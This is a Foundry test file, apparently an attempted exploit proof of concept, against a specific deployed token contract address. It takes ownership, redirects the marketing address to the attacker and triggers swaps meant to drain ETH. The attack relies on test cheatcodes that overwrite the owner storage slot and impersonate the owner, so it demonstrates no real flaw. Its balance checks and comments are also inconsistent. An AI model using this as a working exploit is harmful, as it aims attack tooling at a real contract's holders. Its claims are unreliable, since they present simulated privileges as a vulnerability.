pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function setMarketingAddress(address) external;
    function setSwapAndLiquifyEnabled(bool) external;
    function excludeFromFee(address) external;
    function includeInFee(address) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function afterPreSale() external;
    function marketingAccumulator() external view returns (uint256);
    function setNumTokensSellToAddToLiquidity(uint256) external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

abstract contract Ownable {
    function owner() external virtual view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get some initial ETH
        deal(attacker, 100 ether);

        // Get some tokens to trade
        vm.prank(INOMOS(TARGET).owner());
        INOMOS(TARGET).excludeFromFee(attacker);

        // Buy some tokens via the pair
        address pair = INOMOS(TARGET).uniswapV2Pair();
        address weth = IUniswapV2Router02(INOMOS(TARGET).uniswapV2Router()).WETH();

        // Approve router
        IERC20(weth).approve(address(INOMOS(TARGET).uniswapV2Router()), type(uint256).max);
        INOMOS(TARGET).approve(address(INOMOS(TARGET).uniswapV2Router()), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're the owner
        vm.prank(attacker);
        require(Ownable(TARGET).owner() == attacker, "Failed to become owner");

        // Step 2: Lower the swap threshold to minimum (1 token with 11 decimals)
        vm.prank(attacker);
        INOMOS(TARGET).setNumTokensSellToAddToLiquidity(1 * 10**11); // 1 token

        // Step 3: Ensure contract is in post-presale mode with fees and swap enabled
        vm.prank(attacker);
        INOMOS(TARGET).afterPreSale();

        // Step 4: Change marketing address to our address
        vm.prank(attacker);
        INOMOS(TARGET).setMarketingAddress(attacker);

        // Step 5: Get setup for trading
        address router = address(INOMOS(TARGET).uniswapV2Router());
        address weth = IUniswapV2Router02(router).WETH();

        // Get some WBNB
        deal(weth, attacker, 100 ether);
        IERC20(weth).approve(router, type(uint256).max);

        // Step 6: Buy tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        uint256 buyAmount = 10 ether;

        vm.prank(attacker);
        IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Check contract ETH balance before
        uint256 contractEthBalanceBefore = TARGET.balance;
        uint256 attackerEthBalanceBefore = attacker.balance;
        console.log("Contract ETH balance before:", contractEthBalanceBefore);
        console.log("Attacker ETH balance before:", attackerEthBalanceBefore);

        // Step 7: Sell a small amount to trigger swap
        uint256 tokenBalance = INOMOS(TARGET).balanceOf(attacker);
        INOMOS(TARGET).approve(router, tokenBalance);

        path[0] = TARGET;
        path[1] = weth;

        // Sell just 1% to generate fees
        vm.prank(attacker);
        IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenBalance / 100, // Sell 1%
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 8: Check if contract sent us ETH
        uint256 contractEthBalanceAfter = TARGET.balance;
        uint256 attackerEthBalanceAfter = attacker.balance;
        console.log("Contract ETH balance after:", contractEthBalanceAfter);
        console.log("Attacker ETH balance after:", attackerEthBalanceAfter);

        // The contract should have sent us ETH as marketing address
        require(attackerEthBalanceAfter > attackerEthBalanceBefore, "No ETH received as marketing address");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

